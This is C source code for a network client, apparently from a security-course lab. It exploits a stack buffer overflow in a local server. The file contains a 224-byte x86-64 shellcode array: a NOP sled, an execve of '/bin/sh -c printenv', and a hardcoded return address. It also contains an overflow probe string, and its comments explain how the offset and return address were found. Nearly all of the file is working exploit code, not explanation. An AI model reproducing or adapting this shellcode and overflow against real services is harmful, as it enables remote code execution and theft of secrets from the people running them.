#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

// The length was calculated by counting the number of characters in the comprimise1 array.
// The bulk of the hex values are the exact same as the selfcomp.c, but the return address was calculated 
// using the stack pointer found in the client core dump, we subtracted 208 from that to get the correct 
// address to place in the return address section of the array. The only other difference was the number
// of no-ops instructions, where we took the length of the code without the nops, and subtracted that 
// from the length (224). In this case it was 69. This was validated by adding another one, which gave us an error
char compromise[224]={
 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
 0x90,0x90,0x90,0x90,0x90,0x90,// nops

//; find out where we are
0xEB, 0x52,                    //start:     jmp short codeEnd
0x5E,                     //start2:    pop rsi ; rsi holds exeStr address
                    //; clear the a register
0x48, 0x31, 0xC0,                   //xor rax, rax
                    //; restore null bytes to data
0x88, 0x46, 0x07,                   //mov [rsi+flagStr-exeStr-2],al
0x88, 0x46, 0x0B,                    //mov [rsi+cmdStr-exeStr-1],al
0x88, 0x46, 0x19,                   //mov [rsi+arrayAddr-exeStr-1],al
0x48, 0x89, 0x46, 0x32,                   //mov [rsi+arrayAddr-exeStr+24],rax
0x48, 0x89, 0x76, 0x1A,                   //mov [rsi + arrayAddr - exeStr], rsi
0x48, 0x8D, 0x7E, 0x09,                   //lea rdi, [byte rsi+flagStr-exeStr]
0x48, 0x89, 0x7E, 0x22,                   //mov [rsi + arrayAddr - exeStr +8] , rdi
0x48, 0x8D, 0x7E, 0x0C,                   //lea rdi, [byte rsi+cmdStr-exeStr]
0x48, 0x89, 0x7E, 0x2A,                  //mov [rsi + arrayAddr - exeStr +16] , rdi
                   //; execve system call
0xB0, 0x3B,                  //mov al,0x3b
0x48, 0x89, 0xF7,                  //mov rdi,rsi
0x48, 0x8D, 0x76, 0x1A,                   //lea rsi, [rsi + arrayAddr - exeStr]
0x48, 0x89, 0xE2,                   //mov rdx, rsp
0x48, 0xC1, 0xEA, 0x20,                   //shr rdx, 32
0x48, 0xC1, 0xE2, 0x20,                   //shl rdx, 32
0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                   //mov ecx, 0xf7fbe6ff
0x30, 0xC9,                //xor cl, cl
0x48, 0x09, 0xCA,                    //or  rdx, rcx
0x48, 0x8B, 0x12,            //mov rdx, [rdx]
0x0F, 0x05,                  //syscall
                   //; exit system call
0x48, 0x89, 0xC7,                    //mov rdi,rax
0x48, 0x31, 0xC0,                    //xor rax, rax
0xB0, 0x3C,                   //mov al, 0x3c
0x0F, 0x05,                   //syscall
   
0xE8, 0xA9, 0xFF, 0xFF, 0xFF,                  //codeEnd:   call start2
                   //; data
0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,                 //exeStr:    db "/bin/shXy"
0x2D, 0x63, 0x58,              //flagStr:   db "-cX"
0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,                //cmdStr:    db "printenv;exitX"
0x65, 0x78, 0x69, 0x74, 0x58, 
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //arrayAddr: dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                      //dq 0xffffffffffffffff

0xb0,0xde,0xff,0xff,
0xff,0x7f,0x0A,0x00,    //newAddr:   dd newAddr-start

};

// This is the array that was used to initially comprimise the server. While initially, 193 x's before the MNOPWXYZ produced,
// However, trying to use 209 as the length of the comprimise 1 array did not produce the 139 return code on the server. To do
// this, we added x's until the hex value of MNOPWXYZ showed up in the stack pointer. This was 224 total characters, and with 
// this amount, using comprimise returned code of 139 on the server
char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" // 20
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise1);  
    fflush(outfile);
}

